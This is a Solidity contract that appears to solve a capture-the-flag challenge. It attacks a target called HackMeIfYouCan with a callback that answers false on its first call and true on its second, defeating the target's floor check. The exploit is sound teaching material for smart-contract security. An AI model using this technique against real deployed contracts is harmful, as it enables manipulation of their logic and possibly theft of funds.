// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import "./Contract.sol";

contract BuildingContract {
    HackMeIfYouCan public hackMeIfYouCan;
    bool public switchFlipped =  false; 

    constructor(address contractAdrress){
        hackMeIfYouCan = HackMeIfYouCan(payable(contractAdrress));
    }
    
    function hack() public {
        hackMeIfYouCan.goTo(1);
    }
    
    function isLastFloor(uint) public returns (bool) {
        // first call
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
        // second call
      } else {
        switchFlipped = false;
        return true;
      }
    }
}